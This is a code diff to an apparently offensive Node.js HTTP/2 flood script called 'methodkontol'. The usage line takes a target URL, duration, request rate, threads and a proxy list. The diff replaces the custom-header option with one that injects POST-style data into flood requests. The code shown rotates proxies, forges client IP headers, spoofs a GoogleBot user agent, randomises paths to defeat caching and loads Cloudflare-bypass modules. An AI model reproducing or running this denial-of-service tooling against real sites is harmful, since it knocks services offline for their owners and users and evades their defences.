@@ -24,6 +24,12 @@ const dns = require('dns');
 const lookupPromise = util.promisify(dns.lookup);
 const { v4: uuidv4 } = require('uuid');
 
+
+let headers = {};
+
+
+tls.DEFAULT_ECDH_CURVE;
+
 module.exports = function Cloudflare() {
     const privacypass = require('./privacypass'),
         cloudscraper = require('cloudscraper'),
@@ -995,15 +1001,16 @@ ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECON
 if (process.argv.length < 7){console.log(gradient.vice(`
 node methodkontol <target> <duration> <request per second> <threads> <proxyfile>
 
-node methodkontol https://kontol.com 300 30 3 proxy.txt --randrate --full true --header "f:f#f1:f1"
+node methodkontol https://kontol.com 300 30 3 proxy.txt --postdata "user=f&pass=%RAND%" --randrate --full true
 
 --randrate ( randomizer rate 1 to 90 good bypass to rate )
 `)); process.exit();}
-const customHeadersIndex = process.argv.indexOf('--header');
-const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
 const randrateIndex = process.argv.indexOf('--randrate');
 const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
 let isFull = process.argv.includes('--full');
+const postdataIndex = process.argv.indexOf('--postdata');
+const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
+
 
   function readLines(filePath) {
      return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
@@ -2712,16 +2719,7 @@ const getRandomProxy = () => proxies[Math.floor(Math.random() * proxies.length)]
                 }
                 
                 const proxy = getRandomProxy();
-                const customHeadersArray = [];
-                if (customHeaders) {
-                    const customHeadersList = customHeaders.split('#');
-                    for (const header of customHeadersList) {
-                        const [name, value] = header.split(':');
-                        if (name && value) {
-                            customHeadersArray.push({ [name.trim().toLowerCase()]: value.trim() });
-                        }
-                    }
-                }
+                
                 const fakeHeaders = {
                     'x-real-ip': randIPv4(),
                     'x-forwarded-host': parsedTarget.host,
@@ -2745,7 +2743,7 @@ const getRandomProxy = () => proxies[Math.floor(Math.random() * proxies.length)]
                                 
                                 let oo = {
                                     [http2.constants.HTTP2_HEADER_METHOD]: 'GET',
-                                    [http2.constants.HTTP2_HEADER_PATH]: parsedTarget.path + pathx + "&" + '?' + generateRandomString(5, 15) + '=' + query + generateRandomString(20, 25) + ":443",
+                                    [http2.constants.HTTP2_HEADER_PATH]: parsedTarget.path + pathx + "&" + '?' + generateRandomString(5, 15) + '=' + query + generateRandomString(20, 25) + (postdata ? `?${postdata}` : "") + ":443",
                                     [http2.constants.HTTP2_HEADER_AUTHORITY]: parsedTarget.host,
                                     [http2.constants.HTTP2_HEADER_SCHEME]: 'https',
                                     [http2.constants.HTTP2_HEADER_ACCEPT]: accept,
@@ -2935,13 +2933,13 @@ const getRandomProxy = () => proxies[Math.floor(Math.random() * proxies.length)]
 
                 const request = client.request({
                     ...oo,
-                    ':path': parsedTarget.path + pathx + "&" + '?' + generateRandomString(5, 15) + '=' + query + generateRandomString(20, 25) + ":443",
-                     proxy: proxy
+                    ':path': parsedTarget.path + pathx + "&" + '?' + generateRandomString(5, 15) + '=' + query + generateRandomString(20, 25) + (postdata ? `?${postdata}` : "") + ":443",
+                    proxy: proxy
                   });
                   
                   const request1 = client.request({
                     ...oo,
-                    ':path': parsedTarget.path + pathx + "&" + '?' + generateRandomString(5, 15) + '=' + query + generateRandomString(20, 25) + ":443",
+                    ':path': parsedTarget.path + pathx + "&" + '?' + generateRandomString(5, 15) + '=' + query + generateRandomString(20, 25) + (postdata ? `?${postdata}` : "") + ":443",
                     proxy: proxy
                   });
                            
@@ -2999,16 +2997,6 @@ const getRandomProxy = () => proxies[Math.floor(Math.random() * proxies.length)]
 
                 const proxy = getRandomProxy();
                 
-                const customHeadersArray = [];
-                if (customHeaders) {
-                    const customHeadersList = customHeaders.split('#');
-                    for (const header of customHeadersList) {
-                        const [name, value] = header.split(':');
-                        if (name && value) {
-                            customHeadersArray.push({ [name.trim().toLowerCase()]: value.trim() });
-                        }
-                    }
-                }
                 const fakeHeaders = {
                     'x-real-ip': randIPv4(),
                     'x-forwarded-host': parsedTarget.host,
@@ -3024,7 +3012,6 @@ const getRandomProxy = () => proxies[Math.floor(Math.random() * proxies.length)]
                     'Cache-Control': 'no-cache, no-store, must-revalidate',
                     'Pragma': 'no-cache',
                     'Expires': '0',
-                    ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {}),
                     'User-Agent': uap1 + mos + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7),
                     'Cookie': randomHeaders["cookie"] + "; " + encryptedCookie,
                 };
@@ -3039,7 +3026,7 @@ const getRandomProxy = () => proxies[Math.floor(Math.random() * proxies.length)]
                                 
                                 let oo = {
                                     [http2.constants.HTTP2_HEADER_METHOD]: 'GET',
-                                    [http2.constants.HTTP2_HEADER_PATH]: parsedTarget.path + pathx + "&" + '?' + generateRandomString(5, 15) + '=' + query + generateRandomString(20, 25) + ":443",
+                                    [http2.constants.HTTP2_HEADER_PATH]: parsedTarget.path + pathx + "&" + '?' + generateRandomString(5, 15) + '=' + query + generateRandomString(20, 25) + (postdata ? `?${postdata}` : "") + ":443",
                                     [http2.constants.HTTP2_HEADER_AUTHORITY]: parsedTarget.host,
                                     [http2.constants.HTTP2_HEADER_SCHEME]: 'https',
                                     [http2.constants.HTTP2_HEADER_ACCEPT]: accept,
@@ -3228,13 +3215,13 @@ const getRandomProxy = () => proxies[Math.floor(Math.random() * proxies.length)]
 
                 const request = client.request({
                     ...oo,
-                    ':path': parsedTarget.path + pathx + "&" + '?' + generateRandomString(5, 15) + '=' + query + generateRandomString(20, 25) + ":443",
+                    ':path': parsedTarget.path + pathx + "&" + '?' + generateRandomString(5, 15) + '=' + query + generateRandomString(20, 25) + (postdata ? `?${postdata}` : "") + ":443",
                     proxy: proxy
                   });
                   
                   const request1 = client.request({
                     ...oo,
-                    ':path': parsedTarget.path + pathx + "&" + '?' + generateRandomString(5, 15) + '=' + query + generateRandomString(20, 25)  + ":443",
+                    ':path': parsedTarget.path + pathx + "&" + '?' + generateRandomString(5, 15) + '=' + query + generateRandomString(20, 25) + (postdata ? `?${postdata}` : "") + ":443",
                     proxy: proxy
                   });
                         
